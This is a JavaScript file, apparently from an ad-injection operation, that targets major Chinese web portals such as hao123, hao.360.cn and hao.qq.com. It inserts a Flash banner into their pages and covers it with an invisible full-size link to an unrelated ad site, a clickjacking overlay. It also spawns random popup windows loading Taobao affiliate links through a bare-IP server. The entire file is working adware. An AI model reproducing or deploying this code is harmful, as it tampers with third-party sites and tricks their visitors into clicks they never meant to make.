
var yjwt = {};
yjwt.prefix = 'http://125.39.155.32/';

yjwt.adslist = [
{'url':'http://s.click.taobao.com/t?e=zGU34CA7K%2BPkqB07S4%2FK0CITy7klxxrJ35Nnc0vWbpc2MaPRzL76AoHZsBL27TDmZJsD%2FSnRANz%2BTZcSXLtqk0fqgFeDzn3vk9rn5ILd4dCx2w%3D%3D', 'img':'taobao/4/960X330.gif', 'height':'330', 'width':'960'},
{'url':'http://s.click.taobao.com/t?e=zGU34CA7K%2BPkqB07S4%2FK0CFcRfH0GoT805sipKvI3fILrHcCf37EMMFU2clHVSUoLZtrIRaVV%2FswWdW9ocsemH6tqQ1UERumnjrgVkupWwrtsw%3D%3D', 'img':'taobao/1/390X140.gif', 'height':'140', 'width':'390'},
{'url':'http://s.click.taobao.com/t?e=zGU34CA7K%2BPkqB07S4%2FK0CFcRfH0GoT805sipKvI3fIKIyTgJAlStn0Z116y%2Bx%2FyFp%2FvSrkpsiMziEVEtAhYNE3gkxzuewkWtCXdo6BQxDJQ1A%3D%3D', 'img':'taobao/2/710X245.gif', 'height':'245', 'width':'710'},
{'url':'http://s.click.taobao.com/t?e=zGU34CA7K%2BPkqB07S4%2FK0CFcRfH0GoT805sipKvI3fMySnpGRI%2FVx%2FGJI90vhaN%2F0dxq7KucK7AP4%2BMGVabMiwMWRVVWBni1ImQ%2FhQOR2JMfRg%3D%3D', 'img':'taobao/8/390X140.gif', 'height':'140', 'width':'390'},
{'url':'http://s.click.taobao.com/t?e=zGU34CA7K%2BPkqB07S4%2FK0CITy7klxxrJ35Nnc0vWbpaOTtv7xtnl0tmvZX3n51cpqWLKWLMNXP5QhWe0PejQE5CGdbCGxNijQif%2BAeDgC9GY', 'img':'taobao/9/190X96.jpg', 'height':'96', 'width':'190'},
{'url':'http://s.click.taobao.com/t?e=zGU34CA7K%2BPkqB07S4%2FK0CFcRfH0GoT805sipKvI3fMySn3wUBvbZT%2B3FkiA6RrcetasIgQ8Co01stj4mus5Shp3OJylzXNKVpp4z6Y55e4Ulw%3D%3D', 'img':'taobao/7/960X950.jpg', 'height':'950', 'width':'960'},
{'url':'http://s.click.taobao.com/t?e=zGU34CA7K%2BPkqB07S4%2FK0CFcRfH0GoT805sipKvI3fIKKKaXv3%2BNTJjJAan2CZm%2Bk%2Bf%2FtN4hpTinQdtyNiKfYDcv%2Bj8tnBuYEGtqs1GCUidOsg%3D%3D', 'img':'taobao/5/710X190.gif', 'height':'190', 'width':'710'},
{'url':'http://s.click.taobao.com/t?e=zGU34CA7K%2BPkqB07S4%2FK0CITy7klxxrJ35Nnc0vWbpc2Nw6hQqcPsyjRMBm09w73SyIEHpnjsP7VwOUoM%2BWnPIXavy3fO45o0exFMTTX6H9z', 'img':'taobao/3/960X520.jpg', 'height':'520', 'width':'960'},
{'url':'http://a1722.oadz.com/link/C/1722/3901/lnggWQ9I4S12PAYDrJIr1Sy4RmQ_/p031/0/http://www.jiuxian.com/topic/1221/save/index.html', 'img':'taobao/10/390X335.jpg', 'height':'335', 'width':'390'},
{'url':'http://s.click.taobao.com/t?e=zGU34CA7K%2BPkqB07S4%2FK0CFcRfH0GoT805sipKvI3fMyTxAzSte%2Bk%2FP3PzzNkKazDoCAtMfhxnoeJkvYvhdaNB2teIQ%2FXHiEFhspJbf2CW1WfA%3D%3D', 'img':'taobao/6/240X64.gif', 'height':'64', 'width':'240'},
];

(function () {

	var heredoc = function (f) {
		var s = new String(f);
		return s.substring(s.indexOf("/*<") + 3, s.lastIndexOf(">*/"));  
	};

	var tmpl = heredoc(function () {
		/*<
			<div id='yjwt-sub'
			style="position:relative;text-align:left;
			width:{width};height:{height};font-family:宋体;">
			<embed style="position:absolute;z-index:0" 
			src="{swfsrc}" quality="high" 
			width="{width}" height="{height}" type="application/x-shockwave-flash" 
			pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" wmode="opaque">
			<a href="{href}" target="_blank" 
			style="cursor:pointer;z-index:1; 
			position:absolute;display:block;background:white;
			filter:alpha(opacity=0);opacity:0;width:{width};height:{height};" 
			onfocus="this.blur();"></a>
			</div>
			>*/
	});

	var swfsrc = 'http://125.39.155.32/320x270.swf';

	var adsurl = 'http://tg.17quwan.com/r/dianxin3172/index.html?kwd=01';

	var format = function (w, h) {
		return tmpl.replace(/{width}/g, w+'px').replace(/{height}/g, h+'px')
					.replace(/{href}/g, adsurl).replace(/{swfsrc}/g, swfsrc);
	};

	var select = function (sel) {
		if (sel.charAt(0) == '#') 
			return document.getElementById(sel.substring(1));
		if (sel.charAt(0) == '.') {
			var cls = sel.substring(1);
			var elems = document.getElementsByTagName('*'), i;
			for (i in elems) {
				if ((' ' + elems[i].className + ' ').indexOf(' ' + cls + ' ') > -1) 
					return elems[i];
			}
		}
	};

	var prepend = function (sel, html) {
		var e = select(sel);
		if (e) { 
			e.innerHTML = html + e.innerHTML;
			return 'ok';
		}
	};

	var before = function (sel, html) {
		var e = select(sel);
		if (e) {
			var p = e.parentNode;
			if (p) {
				var ins = document.createElement('div');
				ins.innerHTML = html;
				p.insertBefore(ins, e);
				return 'ok';
			}
		}
	};

	var host = window.location.host;

	var update = function () {
		if (host == 'www.hao222.com') {
			return prepend('#aside', format(220, 200));
		}
		if (host == '2345.com' || host == 'www.2345.com') {
			return prepend('#right', format(224, 200));
		}
		if (host == 'hao.360.cn') {
			return prepend('#channel', format(240, 200));
		}
		if (host == 'www.hao123.com' || host == 'hao123.com') {
			return before('.lcs-info', format(240, 200));
		}
		if (host == '123.sogou.com') {
			return before('#tookitall', format(230, 200));
		}
		if (host == 'www.265.com') {
			return before('#tools', format(186, 130));
		}
		if (host == 'site.baidu.com') {
			return before('#leftwraper', format(192, 130));
		}
		if (host == 'www.114la.com') {
			return before('.col-starBar', format(218, 200));
		}
		if (host == 'hao.qq.com') {
			return before('.barBox', format(209, 200));
		}
		if (host == 'www.5566.net') {
			return before('#div1', format(209, 200));
		}
		if (host == '123.duba.net') {
			return before('.side_a', format(232, 200));
		}
		if (host == 'www.726.com') {
			return before('.bn_L', format(228, 200));
		}
		if (host == 'www.46.com') {
			return before('#tool', format(218, 200));
		}
		if (host == 'hao.163.com') {
			return before('.oneborder', format(228, 200));
		}
		return 'end';
	}

	var retry = 0;

	var timer = function () {
		var r = update();
		if (r == 'ok' || retry++ > 20)
			return ;
		if (r == 'end')
			return ;
		setTimeout(timer, 1000);
	};

	timer();

})();


(function () {
	
	var hostlist = [
		'www.hao222.com', 
		'2345.com', 'www.2345.com',
		'hao.360.cn',
		'www.hao123.com', 'hao123.com',
		'123.sogou.com', 
		'www.265.com',
		'site.baidu.com',
		'www.114la.com',
		'hao.qq.com',
		'www.5566.net',
		'123.duba.net',
		'www.726.com',
		'www.46.com',
		'hao.163.com'
	];

	var blacklist = [
		'www.baidu.com', 'baidu.com'
	];

	var contains = function (list, a) {
		for (var i = 0; i < list.length; i++) {
			if (list[i] == a) {
				return true;
			}
		}
		return false;
	}
		
	var host = window.location.host;

	var pop = function (prob) {
		if (!contains(hostlist, host) || contains(blacklist, host))
			return ;
		if (Math.random() < prob) {
			var r = Math.floor(Math.random() * yjwt.adslist.length);
			var a = yjwt.adslist[r];
			var url = yjwt.prefix + 'ads/' + "pop.html?url=" + encodeURIComponent(a.url) + 
				'&src=' + encodeURIComponent(a.img);
			window.open(url, "_blank", 'height='+a.height+',width='+a.width);
		}
	}

	pop(0.025);

})();

